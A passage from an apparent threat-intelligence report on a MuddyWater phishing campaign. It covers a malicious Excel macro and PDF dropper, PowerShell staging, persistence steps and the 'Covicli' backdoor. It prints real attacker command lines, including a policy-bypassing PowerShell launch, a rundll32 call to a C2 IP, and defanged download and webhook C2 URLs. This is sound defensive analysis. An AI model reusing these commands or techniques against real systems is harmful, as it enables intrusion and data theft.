@@ -1,0 +1,110 @@
+Social Engineering-Based Vector (Vector B)
+Delivery
+The second vector is more in line with common MuddyWater vectors. As mentioned, there is a
+possibility that Vector A was utilized only after initial access was obtained using Vector B.
+In the beginning of the delivery stage, the target receives a link to their corporate email, joined by a link
+to a file storing service. Through this service the victim encounters a ZIP containing the infected file [21] :
+The ZIP contains one of two types of file:
+
+An Excel file containing a malicious macro which communicates with the C2 server, typically
+
+a breached server controlled by the attackers.
+
+A PDF file that drops a malicious dll file to the victim’s network. This is a relatively new vector
+
+for MuddyWater.
+Installation
+Visual Basic Macro code – Embedded in excel
+A screenshot of the excel file:
+21 The screenshots were published by the Israeli CERT
+
+www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020
+TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction
+11 | P a g e
+From the malicious macro embedded in the excel file we can derive that the file used in the attack
+was previously a test file. The macro is divided into different parts:
+Each part of code is encoded in different ways, including ASCII, XOR, and base64. Following is the code
+before decoding and decrypting:
+After combining and decoding all the parts, the excel is run a second time through a COM component
+(taskschd.dll) in the background:
+"C:\Program Files\Microsoft Office\Office14\EXCEL.EXE" /automation -Embedding"
+With this component, 2 pieces of PowerShell code are downloaded to the computer. After that, a
+Scheduled Task is automatically run, to activate WScript:
+This PowerShell code communicates with a breached server from which the group downloads
+malicious files used as the malware’s “Stage 2”. The second server is a C2 server used as storage for
+additional files, not necessarily breached.
+
+www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020
+TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction
+12 | P a g e
+The communication in this instance is carried out through a file named dl which contains PowerShell
+commands. Following is the command that allows running this file (can also be seen in the code):
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -file
+C:\users\public\dl.ps1
+Communications to the server are carried out with GET commands in TCP format (under port 443).
+Following is the specific command to download the file:
+$url = 'hxxps://webmail.lax.co[.]il/owa/auth/Current/Script/jquery-3.5.1.min.js
+A VBS file called db.vbs is downloaded from the server and stored in the Public folder. The
+aforementioned file is an additional PowerShell command, which extracts a third ps1 file. This file,
+called putty.ps1, allows for communication between the second C2 server in this infrastructure and the
+infected machine, as preparation for the downloading of the malware to the machine.
+The aforementioned C2 server is a webhook (Reverse API), from which the attackers download a
+specific file stored at the site. Following are three additional webhooks (aside from the webhook in the
+screenshot), which we have identified throughout the investigation:
+hxxps://webhook[.]site/7c1564f7-4e3c-4082-b1f8-3b52da3d9941
+hxxps://webhook[.]site/861f0c6f-238a-4878-8e44-0ca078ad9b2c
+hxxps://webhook[.]site/f4c2dba3-bdba-44a3-b8b8-f292b6fb8a7b
+The Covicli backdoor will be downloaded from this webhook to the victim’s compromised server.
+
+www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020
+TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction
+13 | P a g e
+Malicious PDF (dropper)
+Similar to the Excel vector, an archive file (mainly ZIP) was sent to an employ of the organization we
+investigated. The file accordingly is in Hebrew, and is about a loan. Here is a screenshot of the PDF file:
+Similarly, to files used in previous campaigns, once the malicious executable is running, two files are
+unloaded to the machine: a legitimate PDF and a malicious DLL. It appears that the attackers have
+advanced their security system avoidance techniques, implementing several camouflaging
+components such as ones designed to refrain from triggering Windows Defender. The attackers
+manage to bypass many identification systems, making technical investigations much more difficult.
+Additionally, the use of Hewlett-Packard MFP was identified, in place of the NSIS executable.
+In the meantime, another folder will be created in the path:
+C:\users\\AppData\Local\
+To gain persistency, the malicious file will be copied to the %temp% folder followed by its deletion
+from the original folder. Another file will be copied to the Startup folder with a PDF’s icon. The attacker
+will also create a scheduled task for a PowerShell that runs a file named xca_db_stat.exe.
+Then, the attacker will create 2 registry keys on the following path:
+\HKEY_CURRENT_USER\Software\Electrum
+Here is a table presenting the new values:
+
+www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020
+TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction
+14 | P a g e
+|Value Name|Details|
+|---|---|
+|Elec|Base64 string that contains data for communication with the C2:- IP of the C2- ID- Key- Cookie|
+|Scan|Text string|
+Covicli Backdoor
+From the C2, a dll file named SSLeay32.dll will be downloaded. This file is a modified OpenSSL dynamic
+library, which was modified for the hacker’s purposes. We identified the following PDB path:
+G:\Project\Covic\Modules\CLI.dll
+Due to the appearance of the word Covic, and the original name given to the file (CLI.dll) by the threat
+actor, we named this backdoor Covicli. This file also contains a module version ID of .net4:
+Command and Control
+The attacker uses the following command line in order to communicate with the C2 over OpenSSL:
+Rundll32.exe C:\ProgramData\RozellaBobine\ssleay32.dll, DllRegisterServer
+hxxp://185.183.96[.]61:80/downloadc.php?key=WKXKgRkJsT
+This server’s Header displays the server’s location as if it is associated with the Azerbaijani government.
+The result of this is diverging access to the server through port 80 but without the path to the following
+site:
+
+www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020
+TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction
+15 | P a g e
+The malware itself generates a scheduled task named Updater (expanded further on) that
+communicates with the server using PowerShell (on port 80), much like MoriAgent. The PowerShell will
+run the following commands: ipconfic, arp, net.
+
+www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020
+TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction
+16 | P a g e
